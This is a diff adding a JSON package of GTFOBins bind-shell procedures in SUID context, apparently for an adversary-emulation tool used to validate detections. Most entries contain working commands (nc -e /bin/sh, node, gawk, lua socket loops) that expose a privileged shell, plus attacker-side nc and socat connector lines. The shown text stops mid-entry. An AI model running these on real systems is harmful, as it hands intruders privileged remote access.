@@ -1,0 +1,1234 @@
+{
+  "package_id": "gtfobins-bind-shell-suid-v1",
+  "package_name": "GTFOBins - Bind Shell / Suid",
+  "version": "1.0.0",
+  "summary": "15 source-derived GTFOBins Living-Off-The-Land procedures for bind shell / Suid.",
+  "description": "Faithful, deterministic conversion of explicit GTFOBins procedures. Commands retain upstream behavior while environment values use Morgana Tags.",
+  "purpose": "Run authorized Living-Off-The-Land detection validation using legitimate native or commonly available utilities in adversary-like ways.",
+  "capabilities": [
+    "Provides 15 distinct source procedures grouped by bind-shell / Suid.",
+    "Preserves source identity, ATT&CK mappings, execution context, prerequisites, and provider metadata.",
+    "Supports deterministic content-only updates from pinned upstream commits."
+  ],
+  "use_cases": [
+    "Validate endpoint and network detections for authorized Living-Off-The-Land behavior.",
+    "Search and import only the utility, function, context, platform, or ATT&CK coverage needed for an exercise."
+  ],
+  "safety_notes": [
+    "Review every command, Tag, privilege requirement, and readiness classification before execution.",
+    "Interactive, elevated, SUID, capability, and counterpart-dependent procedures require an explicitly prepared lab.",
+    "No upstream command is executed during conversion or import."
+  ],
+  "prerequisites": [
+    "The referenced Linux/Unix binary must exist on the target.",
+    "Operator-supplied Tags and any declared privilege or network counterpart must be configured.",
+    "Explicit authorization for the target and procedure behavior."
+  ],
+  "author": "GTFOBins / X3M.AI conversion",
+  "created": "2026-08-28",
+  "script_prefix": "GTFOBINS - ",
+  "provider": "gtfobins",
+  "source": "gtfobins",
+  "source_repository": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "source_commit": "acd524623f9c406acedd2754ebd9c2431f3675ad",
+  "source_license": "GPL-3.0",
+  "documentation_url": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "Bind Shell",
+  "mitre_tcodes": [
+    "T1059"
+  ],
+  "platform": [
+    "linux"
+  ],
+  "risk_badges": [
+    "modify"
+  ],
+  "readiness_counts": {
+    "manual_counterpart_required": 15
+  },
+  "category": "lotl/gtfobins",
+  "tag_categories": [
+    {
+      "category_id": "lotl_gtfobins_parameters",
+      "label": "GTFOBins Runtime Parameters",
+      "description": "Operator-supplied values shared by Living-Off-The-Land procedures.",
+      "scope": "local",
+      "tags": [
+        {
+          "key": "lotl_gtfobins_local_path",
+          "label": "Local Path",
+          "description": "Operator-supplied local path for this authorized LOTL procedure. Source token: /path/to/temp-file.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "local_path"
+        },
+        {
+          "key": "lotl_gtfobins_remote_port",
+          "label": "Remote Port",
+          "description": "Operator-supplied remote port for this authorized LOTL procedure. Source token: \\b12345\\b.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "connection"
+        }
+      ]
+    }
+  ],
+  "assets": [],
+  "scripts": [
+    {
+      "id": "gtfobins:gawk:bind-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - gawk - Bind shell - Suid [14440b3]",
+      "description": "This executable can bind a system shell to a local port waiting for an attacker to connect. Binary: gawk. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "gawk 'BEGIN {\n    s = \"/inet/tcp/#{lotl_gtfobins_remote_port}/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/gawk",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/gawk",
+        "source_bin": "gawk",
+        "function": "bind-shell",
+        "function_label": "Bind shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "connector": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to connect to the shell.",
+              "code": "nc victim.com 12345"
+            },
+            "tcp-client-tty": {
+              "comment": "A TCP client can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "connector": "tcp-client"
+        },
+        "operator_notes": {
+          "connector": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:gawk:bind-shell:0:suid::",
+        "source_name": "gawk",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "bind-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `gawk` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:lualatex:bind-shell:0:suid:0:lualatex>lua",
+      "name": "GTFOBINS - T1059 - lualatex - Bind shell - Suid [9ede284]",
+      "description": "This executable can bind a system shell to a local port waiting for an attacker to connect. Binary: lualatex. Context: SUID. This allows to run Lua code (`...`). Inherits bind-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "lualatex -shell-escape '\\directlua{...}\\end'\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/lualatex",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/lualatex",
+        "source_bin": "lualatex",
+        "function": "bind-shell",
+        "function_label": "Bind shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "lualatex",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "connector": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to connect to the shell.",
+              "code": "nc victim.com 12345"
+            },
+            "tcp-client-tty": {
+              "comment": "A TCP client can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "connector": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "lualatex",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "connector": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:lualatex:bind-shell:0:suid:0:lualatex>lua",
+        "source_name": "lualatex",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "bind-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `lualatex` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:luatex:bind-shell:0:suid:0:luatex>lua",
+      "name": "GTFOBINS - T1059 - luatex - Bind shell - Suid [ea3995a]",
+      "description": "This executable can bind a system shell to a local port waiting for an attacker to connect. Binary: luatex. Context: SUID. This allows to run Lua code (`...`). Inherits bind-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "luatex -shell-escape '\\directlua{...}\\end'\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/luatex",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/luatex",
+        "source_bin": "luatex",
+        "function": "bind-shell",
+        "function_label": "Bind shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "luatex",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "connector": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to connect to the shell.",
+              "code": "nc victim.com 12345"
+            },
+            "tcp-client-tty": {
+              "comment": "A TCP client can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "connector": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "luatex",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "connector": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:luatex:bind-shell:0:suid:0:luatex>lua",
+        "source_name": "luatex",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "bind-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `luatex` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:lua:bind-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - lua - Bind shell - Suid [dd4e6a5]",
+      "description": "This executable can bind a system shell to a local port waiting for an attacker to connect. Binary: lua. Context: SUID. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/lua",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/lua",
+        "source_bin": "lua",
+        "function": "bind-shell",
+        "function_label": "Bind shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "connector": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to connect to the shell.",
+              "code": "nc victim.com 12345"
+            },
+            "tcp-client-tty": {
+              "comment": "A TCP client can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "connector": "tcp-client"
+        },
+        "operator_notes": {
+          "connector": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:lua:bind-shell:0:suid::",
+        "source_name": "lua",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "bind-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `lua` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:nc:bind-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - nc - Bind shell - Suid [7224742]",
+      "description": "This executable can bind a system shell to a local port waiting for an attacker to connect. Binary: nc. Context: SUID. This only works with netcat traditional.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "nc -l -p #{lotl_gtfobins_remote_port} -e /bin/sh",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/nc",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/nc",
+        "source_bin": "nc",
+        "function": "bind-shell",
+        "function_label": "Bind shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "connector": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to connect to the shell.",
+              "code": "nc victim.com 12345"
+            },
+            "tcp-client-tty": {
+              "comment": "A TCP client can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "connector": "tcp-client"
+        },
+        "operator_notes": {
+          "connector": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:nc:bind-shell:0:suid::",
+        "source_name": "nc",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "bind-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `nc` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:nmap:bind-shell:0:suid:0:nmap>lua",
+      "name": "GTFOBINS - T1059 - nmap - Bind shell - Suid [57a8676]",
+      "description": "This executable can bind a system shell to a local port waiting for an attacker to connect. Binary: nmap. Context: SUID. This allows to run Lua code (`...`). Inherits bind-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo '...' >#{lotl_gtfobins_local_path}\nnmap --script=#{lotl_gtfobins_local_path}\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/nmap",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/nmap",
+        "source_bin": "nmap",
+        "function": "bind-shell",
+        "function_label": "Bind shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "nmap",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "connector": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to connect to the shell.",
+              "code": "nc victim.com 12345"
+            },
+            "tcp-client-tty": {
+              "comment": "A TCP client can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "connector": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "nmap",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "connector": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:nmap:bind-shell:0:suid:0:nmap>lua",
+        "source_name": "nmap",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "bind-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `nmap` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:node:bind-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - node - Bind shell - Suid [567e645]",
+      "description": "This executable can bind a system shell to a local port waiting for an attacker to connect. Binary: node. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"]);\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(#{lotl_gtfobins_remote_port})'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/node",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/node",
+        "source_bin": "node",
+        "function": "bind-shell",
+        "function_label": "Bind shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "connector": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to connect to the shell.",
+              "code": "nc victim.com 12345"
+            },
+            "tcp-client-tty": {
+              "comment": "A TCP client can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "code": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"]);\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(12345)'"
+        },
+        "procedure_metadata": {
+          "connector": "tcp-client"
+        },
+        "operator_notes": {
+          "connector": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:node:bind-shell:0:suid::",
+        "source_name": "node",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "bind-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `node` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:pandoc:bind-shell:0:suid:0:pandoc>lua",
+      "name": "GTFOBINS - T1059 - pandoc - Bind shell - Suid [435e2c1]",
+      "description": "This executable can bind a system shell to a local port waiting for an attacker to connect. Binary: pandoc. Context: SUID. This allows to run Lua code (`...`). Inherits bind-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo '...' >#{lotl_gtfobins_local_path}\npandoc -L #{lotl_gtfobins_local_path} /dev/null\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/pandoc",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/pandoc",
+        "source_bin": "pandoc",
+        "function": "bind-shell",
+        "function_label": "Bind shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "pandoc",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "connector": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to connect to the shell.",
+              "code": "nc victim.com 12345"
+            },
+            "tcp-client-tty": {
+              "comment": "A TCP client can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "connector": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "pandoc",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "connector": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:pandoc:bind-shell:0:suid:0:pandoc>lua",
+        "source_name": "pandoc",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "bind-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `pandoc` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:rpmdb:bind-shell:0:suid:0:rpmdb>lua",
+      "name": "GTFOBINS - T1059 - rpmdb - Bind shell - Suid [9a577b0]",
+      "description": "This executable can bind a system shell to a local port waiting for an attacker to connect. Binary: rpmdb. Context: SUID. This allows to run Lua code (`...`). Inherits bind-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "rpmdb --eval '%{lua:...}'\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/rpmdb",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/rpmdb",
+        "source_bin": "rpmdb",
+        "function": "bind-shell",
+        "function_label": "Bind shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "rpmdb",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "connector": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to connect to the shell.",
+              "code": "nc victim.com 12345"
+            },
+            "tcp-client-tty": {
+              "comment": "A TCP client can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "connector": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "rpmdb",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "connector": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:rpmdb:bind-shell:0:suid:0:rpmdb>lua",
+        "source_name": "rpmdb",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "bind-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `rpmdb` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:rpmquery:bind-shell:0:suid:0:rpmquery>lua",
+      "name": "GTFOBINS - T1059 - rpmquery - Bind shell - Suid [6742e6e]",
+      "description": "This executable can bind a system shell to a local port waiting for an attacker to connect. Binary: rpmquery. Context: SUID. This allows to run Lua code (`...`). Inherits bind-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "rpmquery --eval '%{lua:...}'\nlua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",#{lotl_gtfobins_remote_port}));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/rpmquery",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/rpmquery",
+        "source_bin": "rpmquery",
+        "function": "bind-shell",
+        "function_label": "Bind shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "rpmquery",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "connector": {
+            "tcp-client": {
+              "comment": "A TCP client can be used on the attacker box to connect to the shell.",
+              "code": "nc victim.com 12345"
+            },
+            "tcp-client-tty": {
+              "comment": "A TCP client can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "connector": "tcp-client",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "rpmquery",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "connector": "tcp-client"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:rpmquery:bind-shell:0:suid:0:rpmquery>lua",
+        "source_name": "rpmquery",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "bind-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `rpmquery` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:rpmverify:bind-shell:0:suid:0:rpmverify>lua",
+      "name": "GTFOBINS - T1059 - rpmverify - Bind shell - Suid [66a934b]",
+      "description": "This executable can bind a system shell to a local port waiting for an attacker to connect. Binary: rpmverify. Context: SUID. This allows to run Lua code (`...`). Inherits bind-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
